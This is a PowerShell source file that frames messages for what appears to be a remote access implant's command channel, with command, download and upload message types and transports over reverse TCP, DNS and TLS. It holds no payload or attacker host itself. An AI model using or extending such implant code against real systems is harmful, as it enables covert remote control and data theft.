$MESSAGE_HEADER_LEN = 7
$MESSAGE_MAX_DATA_LEN = 102400 - $MESSAGE_HEADER_LEN # TODO: arbitrary value, replace?

$MESSAGE_CHANNEL_COMMAND = 0

$MESSAGE_TYPE_COMMAND = 0
$MESSAGE_TYPE_MESSAGE = 1
$MESSAGE_TYPE_ERRORMESSAGE = 2
$MESSAGE_TYPE_DOWNLOADCOMMAND = 10
$MESSAGE_TYPE_UPLOADCOMMAND = 11
$MESSAGE_TYPE_DATA = 200
$MESSAGE_TYPE_SIZE = 210
$MESSAGE_TYPE_EOC = 255

$MESSAGE_EMPTY_CONTENT = [System.Text.Encoding]::UTF8.GetBytes("EOC")

function Message-Create {
    <#
        .SYNOPSIS
        create a new message from these fields
        .PARAMETER MType
        type field of the message
        .PARAMETER Content
        content
    #>
    param(
        [Parameter(Mandatory=$true)]
        [Byte]
        $MType,

        [Parameter(Mandatory=$true)]
        [UInt16]
        $ChannelNumber,

        [Parameter(Mandatory=$true)]
        [byte[]]
        $Content
    )

	#$len1 = $Content | Measure-Object -Character;
	#$len2 = $len1.Characters
	$leng = $Content.Length
	
    return New-Object -TypeName PSObject -Property @{
       'mtype' = $MType
       'channelnumber' = $ChannelNumber
       'leng' = $leng
       'content' = $Content
    }
}

function Message-SendToTransport([PSObject] $msg, [PSObject] $transport) {
	$len = [System.Net.IPAddress]::HostToNetworkOrder([Int32]$msg.leng)
	$data = New-Object byte[]($msg.leng+$MESSAGE_HEADER_LEN)
	$data[0] = [byte] $msg.mtype
	$channelnumber = [Int16][System.Net.IPAddress]::HostToNetworkOrder([Int16]$msg.channelnumber)
	$channelnumber = [BitConverter]::GetBytes([UInt16] $channelnumber)
	for ($i=0; $i -lt $channelnumber.Length; ++$i) {
	    $data[1+$i] = $channelnumber[$i]
	}
	$lendata = [BitConverter]::GetBytes([Int32] $len)
	for ($i=0; $i -lt $lendata.Length; ++$i) {
	    $data[3+$i] = $lendata[$i]
	}
	for ($i=0; $i -lt $msg.leng; ++$i) {
	    $data[$MESSAGE_HEADER_LEN+$i] = $msg.content[$i]
	}

    Send-ToTransport $transport $data
}

function Message-ParseFromTransport([Parameter(Mandatory=$true)][PSObject] $transport, [Parameter(Mandatory=$false)][byte[]] $messageheaders=$NULL) {
    if ($messageheaders -eq $NULL) {
        $buf = Receive-FromTransport $transport $MESSAGE_HEADER_LEN
    } else {
        $buf = $messageheaders
    }
    
	$MType = [Byte] $buf[0]
	$ChannelNumber = [Int16][BitConverter]::ToInt16($buf, 1)
	$ChannelNumber = [UInt16][System.Net.IPAddress]::NetworkToHostOrder([Int16]$ChannelNumber)
	$leng = [Int32][BitConverter]::ToInt32($buf, 3)
	$leng = [System.Net.IPAddress]::NetworkToHostOrder([Int32]$leng)
	Print-Debug "[Message] message type = $($MType)"
	Print-Debug "[Message] channel number = $($ChannelNumber)"
	Print-Debug "[Message] length = $($leng)"

    $Content = Receive-FromTransport $transport $leng
    #$Content = [System.Text.Encoding]::UTF8.GetString($Content)
	
    return New-Object -TypeName PSObject -Property @{
       'mtype' = $MType
       'channelnumber' = $ChannelNumber
       'leng' = $leng
       'content' = $Content
    }
}


function Send-ToTransport([PSObject] $transport, [byte[]] $data) {
    if ($CHANNELENCRYPTION -eq "NONE") {
        if ($CONNECTIONMETHOD -eq "REVERSETCP") {
            $buf = Transport-ReverseTcp-Send $transport $data
        } elseif ($CONNECTIONMETHOD -eq "DNS") {
            $buf = Transport-Dns-Send $transport $data
        }
    } elseif ($CHANNELENCRYPTION -eq "TLS") {
        $buf = Transport-Tls-Send $transport $data
    }
}

function Receive-FromTransport([PSObject] $transport, [Int32] $leng) {
    if ($CHANNELENCRYPTION -eq "NONE") {
        if ($CONNECTIONMETHOD -eq "REVERSETCP") {
            $buf = Transport-ReverseTcp-Receive $transport $leng
        } elseif ($CONNECTIONMETHOD -eq "DNS") {
            $buf = Transport-Dns-Receive $transport $leng
        }
    } elseif ($CHANNELENCRYPTION -eq "TLS") {
        $buf = Transport-Tls-Receive $transport $leng
    }
    return $buf
}
